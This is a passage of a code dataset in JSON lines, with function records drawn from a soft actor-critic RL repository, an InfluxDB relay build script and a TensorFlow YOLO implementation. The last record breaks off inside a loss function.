{"docstring": "\"\"\"Method to be called at the start of training.\n\n:param env: Environment instance.\n:param policy: Policy instance.\n:return: None\n\"\"\"\n\n", "func_signal": "def _init_training(self, env, policy, pool):\n", "code": "self._env = env\nif self._eval_n_episodes > 0:\n    # TODO: This is horrible. Don't do this. Get rid of this.\n    import tensorflow as tf\n    with tf.variable_scope(\"low_level_policy\", reuse=True):\n        self._eval_env = deep_clone(env)\nself._policy = policy\nself._pool = pool", "path": "sac\\algos\\base.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Sample actions based on the observations.\n\nIf `self._is_deterministic` is True, returns a greedily sampled action\nfor the observations. If False, return stochastically sampled action.\n\nTODO.code_consolidation: This should be somewhat similar with\n`LatentSpacePolicy.get_actions`.\n\"\"\"\n", "func_signal": "def get_actions(self, observations):\n", "code": "if self._is_deterministic: # Handle the deterministic case separately.\n    if self._qf is None: raise AttributeError\n\n    feed_dict = {self._observations_ph: observations}\n\n    # TODO.code_consolidation: these shapes should be double checked\n    # for case where `observations.shape[0] > 1`\n    mus = tf.get_default_session().run(\n        self.distribution.mus_t, feed_dict)[0]  # K x Da\n\n    squashed_mus = np.tanh(mus) if self._squash else mus\n    qs = self._qf.eval(observations, squashed_mus)\n\n    if self._fixed_h is not None:\n        h = self._fixed_h # TODO.code_consolidation: this needs to be tiled\n    else:\n        h = np.argmax(qs) # TODO.code_consolidation: check the axis\n\n    actions = squashed_mus[h, :][None]\n    return actions\n\nreturn super(GMMPolicy, self).get_actions(observations)", "path": "sac\\policies\\gmm.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Concatenates the observation to a one-hot encoding of Z.\"\"\"\n", "func_signal": "def concat_obs_z(obs, z, num_skills):\n", "code": "assert np.isscalar(z)\nz_one_hot = np.zeros(num_skills)\nz_one_hot[z] = 1\nreturn np.hstack([obs, z_one_hot])", "path": "sac\\misc\\utils.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Splits an augmented observation into the observation and Z.\"\"\"\n", "func_signal": "def split_aug_obs(aug_obs, num_skills):\n", "code": "(obs, z_one_hot) = (aug_obs[:-num_skills], aug_obs[-num_skills:])\nz = np.where(z_one_hot == 1)[0][0]\nreturn (obs, z)", "path": "sac\\misc\\utils.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Context manager for changing the determinism of the policy.\n\nSee `self.get_action` for further information about the effect of\nself._is_deterministic.\n\nArgs:\n    set_deterministic (`bool`): Value to set the self._is_deterministic\n        to during the context. The value will be reset back to the\n        previous value when the context exits.\n    latent (`Number`): Value to set the latent variable to over the\n        deterministic context.\n\"\"\"\n", "func_signal": "def deterministic(self, set_deterministic=True, latent=None):\n", "code": "was_deterministic = self._is_deterministic\n\nself._is_deterministic = set_deterministic\n\nyield\n\nself._is_deterministic = was_deterministic", "path": "sac\\policies\\gaussian_policy.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "# Create a symbolic link that points to the sac folder and include it\n# in the tarball.\n\n# Unique filename for the symlink.\n", "func_signal": "def _create_symlink(folder):\n", "code": "include_path = os.path.join('/tmp/', str(uuid.uuid4()))\nos.makedirs(include_path)\n\nos.symlink(os.path.join(PROJECT_PATH, folder),\n           os.path.join(include_path, folder))\n\nreturn include_path", "path": "sac\\misc\\instrument.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "# Choose a skill if necessary\n", "func_signal": "def get_action(self, obs):\n", "code": "if self._t % self._steps_per_option == 0:\n    self._z = np.random.choice(self._num_skills)\nself._t += 1\naug_obs = concat_obs_z(obs, self._z, self._num_skills)\nreturn self._base_policy.get_action(aug_obs)", "path": "sac\\policies\\hierarchical_policy.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Sample actions based on the observations.\n\nIf `self._is_deterministic` is True, returns the mean action for the \nobservations. If False, return stochastically sampled action.\n\nTODO.code_consolidation: This should be somewhat similar with\n`LatentSpacePolicy.get_actions`.\n\"\"\"\n", "func_signal": "def get_actions(self, observations):\n", "code": "if self._is_deterministic: # Handle the deterministic case separately.\n\n    feed_dict = {self._observations_ph: observations}\n\n    # TODO.code_consolidation: these shapes should be double checked\n    # for case where `observations.shape[0] > 1`\n    mu = tf.get_default_session().run(\n        self.distribution.mu_t, feed_dict)  # 1 x Da\n    if self._squash:\n        mu = np.tanh(mu)\n\n    return mu\n\nreturn super(GaussianPolicy, self).get_actions(observations)", "path": "sac\\policies\\gaussian_policy.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Record diagnostic information to the logger.\n\nRecords the mean, min, max, and standard deviation of the GMM\nmeans, component weights, and covariances.\n\"\"\"\n\n", "func_signal": "def log_diagnostics(self, iteration, batch):\n", "code": "feeds = {self._observations_ph: batch['observations']}\nsess = tf_utils.get_default_session()\nmus, log_sigs, log_ws, log_pis = sess.run(\n    (\n        self.distribution.mus_t,\n        self.distribution.log_sigs_t,\n        self.distribution.log_ws_t,\n        self.distribution.log_p_t,\n    ),\n    feeds\n)\n\nlogger.record_tabular('gmm-mus-mean', np.mean(mus))\nlogger.record_tabular('gmm-mus-min', np.min(mus))\nlogger.record_tabular('gmm-mus-max', np.max(mus))\nlogger.record_tabular('gmm-mus-std', np.std(mus))\nlogger.record_tabular('gmm-log-w-mean', np.mean(log_ws))\nlogger.record_tabular('gmm-log-w-min', np.min(log_ws))\nlogger.record_tabular('gmm-log-w-max', np.max(log_ws))\nlogger.record_tabular('gmm-log-w-std', np.std(log_ws))\nlogger.record_tabular('gmm-log-sigs-mean', np.mean(log_sigs))\nlogger.record_tabular('gmm-log-sigs-min', np.min(log_sigs))\nlogger.record_tabular('gmm-log-sigs-max', np.max(log_sigs))\nlogger.record_tabular('gmm-log-sigs-std', np.std(log_sigs))\nlogger.record_tabular('log_pi_mean', np.mean(log_pis))\nlogger.record_tabular('log_pi_max', np.max(log_pis))\nlogger.record_tabular('log_pi_min', np.min(log_pis))", "path": "sac\\policies\\gmm.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"TODO\"\"\"\n", "func_signal": "def _maybe_assert_valid_y(self, y):\n", "code": "if not self.validate_args:\n    return y\nraise NotImplementedError(\"_maybe_assert_valid_y\")", "path": "sac\\distributions\\real_nvp_bijector.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Record diagnostic information to the logger.\n\nRecords the mean, min, max, and standard deviation of the GMM\nmeans, component weights, and covariances.\n\"\"\"\n\n", "func_signal": "def log_diagnostics(self, iteration, batch):\n", "code": "feeds = {self._observations_ph: batch['observations']}\nsess = tf_utils.get_default_session()\nmu, log_sig, log_pi = sess.run(\n    (\n        self.distribution.mu_t,\n        self.distribution.log_sig_t,\n        self.distribution.log_p_t,\n    ),\n    feeds\n)\n\nlogger.record_tabular('policy-mus-mean', np.mean(mu))\nlogger.record_tabular('policy-mus-min', np.min(mu))\nlogger.record_tabular('policy-mus-max', np.max(mu))\nlogger.record_tabular('policy-mus-std', np.std(mu))\nlogger.record_tabular('log-sigs-mean', np.mean(log_sig))\nlogger.record_tabular('log-sigs-min', np.min(log_sig))\nlogger.record_tabular('log-sigs-max', np.max(log_sig))\nlogger.record_tabular('log-sigs-std', np.std(log_sig))\nlogger.record_tabular('log-pi-mean', np.mean(log_pi))\nlogger.record_tabular('log-pi-max', np.max(log_pi))\nlogger.record_tabular('log-pi-min', np.min(log_pi))\nlogger.record_tabular('log-pi-std', np.std(log_pi))", "path": "sac\\policies\\gaussian_policy.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "# Choose a skill if necessary\n", "func_signal": "def get_action(self, obs):\n", "code": "if self._t % self._steps_per_option == 0:\n    (self._z, _) = self._meta_policy.get_action(obs)\nself._t += 1\naug_obs = concat_obs_z(obs, self._z, self._num_skills)\nreturn self._base_policy.get_action(aug_obs)", "path": "sac\\policies\\hierarchical_policy.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Context manager for changing the determinism of the policy.\n\nSee `self.get_action` for further information about the effect of\nself._is_deterministic.\n\nArgs:\n    set_deterministic (`bool`): Value to set the self._is_deterministic\n        to during the context. The value will be reset back to the\n        previous value when the context exits.\n    latent (`Number`): Value to set the latent variable to over the\n        deterministic context.\n\"\"\"\n", "func_signal": "def deterministic(self, set_deterministic=True, latent=None):\n", "code": "was_deterministic = self._is_deterministic\nold_fixed_h = self._fixed_h\n\nself._is_deterministic = set_deterministic\nif set_deterministic:\n    if latent is None: latent = self.sample_z.eval()\n    self._fixed_h = latent\n\nyield\n\nself._is_deterministic = was_deterministic\nself._fixed_h = old_fixed_h", "path": "sac\\policies\\gmm.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Record diagnostic information to the logger.\"\"\"\n\n", "func_signal": "def log_diagnostics(self, iteration, batch):\n", "code": "feeds = { self._observations_ph: batch['observations'] }\nraw_actions, actions, log_pis = tf.get_default_session().run(\n    (self._raw_actions, self._actions, self._log_pis), feeds)\n\nlogger.record_tabular('policy-entropy-mean', -np.mean(log_pis))\nlogger.record_tabular('log-pi-min', np.min(log_pis))\nlogger.record_tabular('log-pi-max', np.max(log_pis))\n\nlogger.record_tabular('actions-mean', np.mean(actions))\nlogger.record_tabular('actions-min', np.min(actions))\nlogger.record_tabular('actions-max', np.max(actions))\n\nlogger.record_tabular('raw-actions-mean', np.mean(raw_actions))\nlogger.record_tabular('raw-actions-min', np.min(raw_actions))\nlogger.record_tabular('raw-actions-max', np.max(raw_actions))", "path": "sac\\policies\\latent_space_policy.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"TODO\"\"\"\n", "func_signal": "def _maybe_assert_valid_y(self, y):\n", "code": "if not self.validate_args:\n    return y\nraise NotImplementedError(\"_maybe_assert_valid_y\")", "path": "sac\\distributions\\real_nvp_bijector.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"TODO\"\"\"\n", "func_signal": "def _maybe_assert_valid_x(self, x):\n", "code": "if not self.validate_args:\n    return x\nraise NotImplementedError(\"_maybe_assert_valid_x\")", "path": "sac\\distributions\\real_nvp_bijector.py", "repo_name": "haarnoja/sac", "stars": 802, "license": "other", "language": "python", "size": 619}
{"docstring": "\"\"\"Create a filesystem structure to mimic the package filesystem.\n\"\"\"\n", "func_signal": "def create_package_fs(build_root):\n", "code": "logging.debug(\"Creating package filesystem at location: {}\".format(build_root))\n# Using [1:] for the path names due to them being absolute\n# (will overwrite previous paths, per 'os.path.join' documentation)\ndirs = [ INSTALL_ROOT_DIR[1:],\n         LOG_DIR[1:],\n         DATA_DIR[1:],\n         SCRIPT_DIR[1:],\n         CONFIG_DIR[1:],\n         LOGROTATE_DIR[1:] ]\nfor d in dirs:\n    os.makedirs(os.path.join(build_root, d))\n    os.chmod(os.path.join(build_root, d), 0o755)", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Copy the necessary scripts and configuration files to the package\nfilesystem.\n\"\"\"\n", "func_signal": "def package_scripts(build_root, config_only=False):\n", "code": "if config_only:\n    logging.debug(\"Copying configuration to build directory.\")\n    shutil.copyfile(DEFAULT_CONFIG, os.path.join(build_root, \"influxdb-relay.conf\"))\n    os.chmod(os.path.join(build_root, \"influxdb-relay.conf\"), 0o644)\nelse:\n    logging.debug(\"Copying scripts and sample configuration to build directory.\")\n    shutil.copyfile(INIT_SCRIPT, os.path.join(build_root, SCRIPT_DIR[1:], INIT_SCRIPT.split('/')[1]))\n    os.chmod(os.path.join(build_root, SCRIPT_DIR[1:], INIT_SCRIPT.split('/')[1]), 0o644)\n    shutil.copyfile(SYSTEMD_SCRIPT, os.path.join(build_root, SCRIPT_DIR[1:], SYSTEMD_SCRIPT.split('/')[1]))\n    os.chmod(os.path.join(build_root, SCRIPT_DIR[1:], SYSTEMD_SCRIPT.split('/')[1]), 0o644)\n    shutil.copyfile(LOGROTATE_SCRIPT, os.path.join(build_root, LOGROTATE_DIR[1:], \"influxdb-relay\"))\n    os.chmod(os.path.join(build_root, LOGROTATE_DIR[1:], \"influxdb-relay\"), 0o644)\n    shutil.copyfile(DEFAULT_CONFIG, os.path.join(build_root, CONFIG_DIR[1:], \"influxdb-relay.conf\"))\n    os.chmod(os.path.join(build_root, CONFIG_DIR[1:], \"influxdb-relay.conf\"), 0o644)", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\" Create temporary directory with optional prefix.\n\"\"\"\n", "func_signal": "def create_temp_dir(prefix = None):\n", "code": "if prefix is None:\n    return tempfile.mkdtemp(prefix=\"{}-build.\".format(PACKAGE_NAME))\nelse:\n    return tempfile.mkdtemp(prefix=prefix)", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Check user path for required dependencies.\n\"\"\"\n", "func_signal": "def check_prereqs():\n", "code": "logging.info(\"Checking for dependencies...\")\nfor req in prereqs:\n    if not check_path_for(req):\n        logging.error(\"Could not find dependency: {}\".format(req))\n        return False\nreturn True", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Retrieve the current git commit.\n\"\"\"\n", "func_signal": "def get_current_commit(short=False):\n", "code": "command = None\nif short:\n    command = \"git log --pretty=format:'%h' -n 1\"\nelse:\n    command = \"git rev-parse HEAD\"\nout = run(command)\nreturn out.strip('\\'\\n\\r ')", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Return the version with the minor version incremented and patch\nversion set to zero.\n\"\"\"\n", "func_signal": "def increment_minor_version(version):\n", "code": "ver_list = version.split('.')\nif len(ver_list) != 3:\n    logging.warn(\"Could not determine how to increment version '{}', will just use provided version.\".format(version))\n    return version\nver_list[1] = str(int(ver_list[1]) + 1)\nver_list[2] = str(0)\ninc_version = '.'.join(ver_list)\nlogging.debug(\"Incremented version from '{}' to '{}'.\".format(version, inc_version))\nreturn inc_version", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Retrieve version information for Go.\n\"\"\"\n", "func_signal": "def get_go_version():\n", "code": "out = run(\"go version\")\nmatches = re.search('go version go(\\S+)', out)\nif matches is not None:\n    return matches.groups()[0].strip()\nreturn None", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Retrieve the current git branch.\n\"\"\"\n", "func_signal": "def get_current_branch():\n", "code": "command = \"git rev-parse --abbrev-ref HEAD\"\nout = run(command)\nreturn out.strip()", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Return True if there are local un-committed changes.\n\"\"\"\n", "func_signal": "def local_changes():\n", "code": "output = run(\"git diff-files --ignore-submodules --\").strip()\nif len(output) > 0:\n    return True\nreturn False", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Retrieve build dependencies or restore pinned dependencies.\n\"\"\"\n", "func_signal": "def go_get(branch, update=False, no_uncommitted=False):\n", "code": "if local_changes() and no_uncommitted:\n    logging.error(\"There are uncommitted changes in the current directory.\")\n    return False\nreturn True", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Package the output of the build process.\n\"\"\"\n", "func_signal": "def package(build_output, version, nightly=False, iteration=1, static=False, release=False):\n", "code": "outfiles = []\ntmp_build_dir = create_temp_dir()\nlogging.debug(\"Packaging for build output: {}\".format(build_output))\nlogging.info(\"Using temporary directory: {}\".format(tmp_build_dir))\ntry:\n    for platform in build_output:\n        # Create top-level folder displaying which platform (linux, etc)\n        os.makedirs(os.path.join(tmp_build_dir, platform))\n        for arch in build_output[platform]:\n            logging.info(\"Creating packages for {}/{}\".format(platform, arch))\n            # Create second-level directory displaying the architecture (amd64, etc)\n            current_location = build_output[platform][arch]\n\n            # Create directory tree to mimic file system of package\n            build_root = os.path.join(tmp_build_dir,\n                                      platform,\n                                      arch,\n                                      '{}-{}-{}'.format(PACKAGE_NAME, version, iteration))\n            os.makedirs(build_root)\n\n            # Copy packaging scripts to build directory\n            if platform == \"windows\" or static or \"static_\" in arch:\n                # For windows and static builds, just copy\n                # binaries to root of package (no other scripts or\n                # directories)\n                package_scripts(build_root, config_only=True)\n            else:\n                create_package_fs(build_root)\n                package_scripts(build_root)\n\n            for binary in targets:\n                # Copy newly-built binaries to packaging directory\n                if platform == 'windows':\n                    binary = binary + '.exe'\n                if platform == 'windows' or static or \"static_\" in arch:\n                    # Where the binary should go in the package filesystem\n                    to = os.path.join(build_root, binary)\n                    # Where the binary currently is located\n                    fr = os.path.join(current_location, binary)\n                else:\n                    # Where the binary currently is located\n                    fr = os.path.join(current_location, binary)\n                    # Where the binary should go in the package filesystem\n                    to = os.path.join(build_root, INSTALL_ROOT_DIR[1:], binary)\n                shutil.copy(fr, to)\n\n            for package_type in supported_packages[platform]:\n                # Package the directory structure for each package type for the platform\n                logging.debug(\"Packaging directory '{}' as '{}'.\".format(build_root, package_type))\n                name = PACKAGE_NAME\n                # Reset version, iteration, and current location on each run\n                # since they may be modified below.\n                package_version = \"{}\".format(version)\n                package_iteration = iteration\n                if \"static_\" in arch:\n                    # Remove the \"static_\" from the displayed arch on the package\n                    package_arch = arch.replace(\"static_\", \"\")\n                else:\n                    package_arch = arch\n                package_build_root = build_root\n                current_location = build_output[platform][arch]\n                if package_type in ['zip', 'tar']:\n                    # For tars and zips, start the packaging one folder above\n                    # the build root (to include the package name)\n                    package_build_root = os.path.join('/', '/'.join(build_root.split('/')[:-1]))\n                    if nightly:\n                        if static or \"static_\" in arch:\n                            name = '{}-static-nightly_{}_{}'.format(name,\n                                                                    platform,\n                                                                    package_arch)\n                        else:\n                            name = '{}-nightly_{}_{}'.format(name,\n                                                             platform,\n                                                             package_arch)\n                    else:\n                        if static or \"static_\" in arch:\n                            name = '{}-{}-{}-static_{}_{}'.format(name,\n                                                                  package_version,\n                                                                  package_iteration,\n                                                                  platform,\n                                                                  package_arch)\n                        else:\n                            name = '{}-{}-{}_{}_{}'.format(name,\n                                                           package_version,\n                                                           package_iteration,\n                                                           platform,\n                                                           package_arch)\n                    current_location = os.path.join(os.getcwd(), current_location)\n                    if package_type == 'tar':\n                        tar_command = \"cd {} && tar -cvzf {}.tar.gz ./*\".format(build_root, name)\n                        run(tar_command, shell=True)\n                        run(\"mv {}.tar.gz {}\".format(os.path.join(build_root, name), current_location), shell=True)\n                        outfile = os.path.join(current_location, name + \".tar.gz\")\n                        outfiles.append(outfile)\n                    elif package_type == 'zip':\n                        zip_command = \"cd {} && zip -r {}.zip ./*\".format(build_root, name)\n                        run(zip_command, shell=True)\n                        run(\"mv {}.zip {}\".format(os.path.join(build_root, name), current_location), shell=True)\n                        outfile = os.path.join(current_location, name + \".zip\")\n                        outfiles.append(outfile)\n                elif package_type not in ['zip', 'tar'] and static or \"static_\" in arch:\n                    logging.info(\"Skipping package type '{}' for static builds.\".format(package_type))\n                else:\n                    fpm_command = \"fpm {} --name {} -a {} -t {} --version {} --iteration {} -C {} -p {} \".format(\n                        fpm_common_args,\n                        name,\n                        package_arch,\n                        package_type,\n                        package_version,\n                        package_iteration,\n                        package_build_root,\n                        current_location)\n                    if package_type == \"rpm\":\n                        fpm_command += \"--depends coreutils --rpm-posttrans {}\".format(POSTINST_SCRIPT)\n                    out = run(fpm_command, shell=True)\n                    matches = re.search(':path=>\"(.*)\"', out)\n                    outfile = None\n                    if matches is not None:\n                        outfile = matches.groups()[0]\n                    if outfile is None:\n                        logging.warn(\"Could not determine output from packaging output!\")\n                    else:\n                        if nightly:\n                            # Strip nightly version from package name\n                            new_outfile = outfile.replace(\"{}-{}\".format(package_version, package_iteration), \"nightly\")\n                            os.rename(outfile, new_outfile)\n                            outfile = new_outfile\n                        else:\n                            if package_type == 'rpm':\n                                # rpm's convert any dashes to underscores\n                                package_version = package_version.replace(\"-\", \"_\")\n                            new_outfile = outfile.replace(\"{}-{}\".format(package_version, package_iteration), package_version)\n                            os.rename(outfile, new_outfile)\n                            outfile = new_outfile\n                        outfiles.append(os.path.join(os.getcwd(), outfile))\n    logging.debug(\"Produced package files: {}\".format(outfiles))\n    return outfiles\nfinally:\n    # Cleanup\n    shutil.rmtree(tmp_build_dir)", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"\nReturn a list of packages\nIf vendor is False vendor package are not included\nIf relative is True the package prefix defined by PACKAGE_URL is stripped\n\"\"\"\n", "func_signal": "def go_list(vendor=False, relative=False):\n", "code": "p = subprocess.Popen([\"go\", \"list\", \"./...\"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\nout, err = p.communicate()\npackages = out.split('\\n')\nif packages[-1] == '':\n    packages = packages[:-1]\nif not vendor:\n    non_vendor = []\n    for p in packages:\n        if '/vendor/' not in p:\n            non_vendor.append(p)\n    packages = non_vendor\nif relative:\n    relative_pkgs = []\n    for p in packages:\n        r = p.replace(PACKAGE_URL, '.')\n        if r != '.':\n            relative_pkgs.append(r)\n    packages = relative_pkgs\nreturn packages", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Retrieve current system platform.\n\"\"\"\n", "func_signal": "def get_system_platform():\n", "code": "if sys.platform.startswith(\"linux\"):\n    return \"linux\"\nelse:\n    return sys.platform", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Retrieve the raw git version tag.\n\"\"\"\n", "func_signal": "def get_current_version_tag():\n", "code": "version = run(\"git describe --always --tags --abbrev=0\")\nreturn version", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Parse version information from git tag output.\n\"\"\"\n", "func_signal": "def get_current_version():\n", "code": "version_tag = get_current_commit(short=True)\nreturn version_tag", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Run shell command (convenience wrapper around subprocess).\n\"\"\"\n", "func_signal": "def run(command, allow_failure=False, shell=False):\n", "code": "out = None\nlogging.debug(\"{}\".format(command))\ntry:\n    if shell:\n        out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=shell)\n    else:\n        out = subprocess.check_output(command.split(), stderr=subprocess.STDOUT)\n    out = out.decode('utf-8').strip()\n    # logging.debug(\"Command output: {}\".format(out))\nexcept subprocess.CalledProcessError as e:\n    if allow_failure:\n        logging.warn(\"Command '{}' failed with error: {}\".format(command, e.output))\n        return None\n    else:\n        logging.error(\"Command '{}' failed with error: {}\".format(command, e.output))\n        sys.exit(1)\nexcept OSError as e:\n    if allow_failure:\n        logging.warn(\"Command '{}' failed with error: {}\".format(command, e))\n        return out\n    else:\n        logging.error(\"Command '{}' failed with error: {}\".format(command, e))\n        sys.exit(1)\nelse:\n    return out", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Retrieve current system architecture.\n\"\"\"\n", "func_signal": "def get_system_arch():\n", "code": "arch = os.uname()[4]\nif arch == \"x86_64\":\n    arch = \"amd64\"\nelif arch == \"386\":\n    arch = \"i386\"\nelif 'arm' in arch:\n    # Prevent uname from reporting full ARM arch (eg 'armv7l')\n    arch = \"arm\"\nreturn arch", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Check environment for common Go variables.\n\"\"\"\n", "func_signal": "def check_environ(build_dir = None):\n", "code": "logging.info(\"Checking environment...\")\nfor v in [ \"GOPATH\", \"GOBIN\", \"GOROOT\" ]:\n    logging.debug(\"Using '{}' for {}\".format(os.environ.get(v), v))\n\ncwd = os.getcwd()\nif build_dir is None and os.environ.get(\"GOPATH\") and os.environ.get(\"GOPATH\") not in cwd:\n    logging.warn(\"Your current directory is not under your GOPATH. This may lead to build failures.\")\nreturn True", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Generate MD5 signature based on the contents of the file at path.\n\"\"\"\n", "func_signal": "def generate_md5_from_file(path):\n", "code": "m = hashlib.md5()\nwith open(path, 'rb') as f:\n    for chunk in iter(lambda: f.read(4096), b\"\"):\n        m.update(chunk)\nreturn m.hexdigest()", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"Check the the user's path for the provided binary.\n\"\"\"\n", "func_signal": "def check_path_for(b):\n", "code": "def is_exe(fpath):\n    return os.path.isfile(fpath) and os.access(fpath, os.X_OK)\n\nfor path in os.environ[\"PATH\"].split(os.pathsep):\n    path = path.strip('\"')\n    full_path = os.path.join(path, b)\n    if os.path.isfile(full_path) and os.access(full_path, os.X_OK):\n        return full_path", "path": "build.py", "repo_name": "influxdata/influxdb-relay", "stars": 827, "license": "mit", "language": "python", "size": 88}
{"docstring": "\"\"\"record_queue's processor\n\"\"\"\n", "func_signal": "def record_producer(self):\n", "code": "while True:\n  if self.record_point % self.record_number == 0:\n    random.shuffle(self.record_list)\n    self.record_point = 0\n  self.record_queue.put(self.record_list[self.record_point])\n  self.record_point += 1", "path": "yolo\\dataset\\text_dataset.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"record queue's customer \n\"\"\"\n", "func_signal": "def record_customer(self):\n", "code": "while True:\n  item = self.record_queue.get()\n  out = self.record_process(item)\n  self.image_label_queue.put(out)", "path": "yolo\\dataset\\text_dataset.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"\ncalculate loss\nArgs:\n  predict: 3-D tensor [cell_size, cell_size, 5 * boxes_per_cell]\n  labels : [max_objects, 5]  (x_center, y_center, w, h, class)\n\"\"\"\n", "func_signal": "def body1(self, num, object_num, loss, predict, labels, nilboy):\n", "code": "label = labels[num:num+1, :]\nlabel = tf.reshape(label, [-1])\n\n#calculate objects  tensor [CELL_SIZE, CELL_SIZE]\nmin_x = (label[0] - label[2] / 2) / (self.image_size / self.cell_size)\nmax_x = (label[0] + label[2] / 2) / (self.image_size / self.cell_size)\n\nmin_y = (label[1] - label[3] / 2) / (self.image_size / self.cell_size)\nmax_y = (label[1] + label[3] / 2) / (self.image_size / self.cell_size)\n\nmin_x = tf.floor(min_x)\nmin_y = tf.floor(min_y)\n\nmax_x = tf.ceil(max_x)\nmax_y = tf.ceil(max_y)\n\ntemp = tf.cast(tf.stack([max_y - min_y, max_x - min_x]), dtype=tf.int32)\nobjects = tf.ones(temp, tf.float32)\n\ntemp = tf.cast(tf.stack([min_y, self.cell_size - max_y, min_x, self.cell_size - max_x]), tf.int32)\ntemp = tf.reshape(temp, (2, 2))\nobjects = tf.pad(objects, temp, \"CONSTANT\")\n\n#calculate objects  tensor [CELL_SIZE, CELL_SIZE]\n#calculate responsible tensor [CELL_SIZE, CELL_SIZE]\ncenter_x = label[0] / (self.image_size / self.cell_size)\ncenter_x = tf.floor(center_x)\n\ncenter_y = label[1] / (self.image_size / self.cell_size)\ncenter_y = tf.floor(center_y)\n\nresponse = tf.ones([1, 1], tf.float32)\n\ntemp = tf.cast(tf.stack([center_y, self.cell_size - center_y - 1, center_x, self.cell_size -center_x - 1]), tf.int32)\ntemp = tf.reshape(temp, (2, 2))\nresponse = tf.pad(response, temp, \"CONSTANT\")\n#objects = response\n\n#calculate iou_predict_truth [CELL_SIZE, CELL_SIZE, BOXES_PER_CELL]\npredict_boxes = predict[:, :, self.num_classes + self.boxes_per_cell:]\n\n\npredict_boxes = tf.reshape(predict_boxes, [self.cell_size, self.cell_size, self.boxes_per_cell, 4])\n\npredict_boxes = predict_boxes * [self.image_size / self.cell_size, self.image_size / self.cell_size, self.image_size, self.image_size]\n\nbase_boxes = np.zeros([self.cell_size, self.cell_size, 4])\n\nfor y in range(self.cell_size):\n  for x in range(self.cell_size):\n    #nilboy\n    base_boxes[y, x, :] = [self.image_size / self.cell_size * x, self.image_size / self.cell_size * y, 0, 0]\nbase_boxes = np.tile(np.resize(base_boxes, [self.cell_size, self.cell_size, 1, 4]), [1, 1, self.boxes_per_cell, 1])\n\npredict_boxes = base_boxes + predict_boxes\n\niou_predict_truth = self.iou(predict_boxes, label[0:4])\n#calculate C [cell_size, cell_size, boxes_per_cell]\nC = iou_predict_truth * tf.reshape(response, [self.cell_size, self.cell_size, 1])\n\n#calculate I tensor [CELL_SIZE, 